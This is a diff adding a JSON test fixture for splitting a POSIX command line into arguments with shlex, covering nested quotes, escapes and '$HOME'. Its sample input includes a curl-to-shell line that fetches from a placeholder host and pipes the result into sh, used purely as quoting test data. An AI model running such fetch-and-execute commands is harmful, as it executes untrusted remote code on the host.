@@ -1,0 +1,8 @@
+{
+ "material": "/bin/sh -c 'curl -s '\"'\"'http://x.invalid/a b'\"'\"' | sh' 'it'\"'\"'s' 'q\"uote' '$HOME' \"dq \\\"y\\\"\" back\\ slash",
+ "rep": "cmdline",
+ "transform": "argv_posix",
+ "expected": "[\"/bin/sh\", \"-c\", \"curl -s 'http://x.invalid/a b' | sh\", \"it's\", \"q\\\"uote\", \"$HOME\", \"dq \\\"y\\\"\", \"back slash\"]",
+ "generator_cmd": "python3 -c 'import shlex; print(shlex.join(['/bin/sh', '-c', \"curl -s 'http://x.invalid/a b' | sh\", \"it's\", 'q\"uote', '$HOME']))' + ' \"dq \\\\\"y\\\\\"\" back\\\\ slash'",
+ "oracle_cmd": "python3 -c 'import shlex,json,sys; print(json.dumps(shlex.split(sys.argv[1])))' \"$S\""
+}
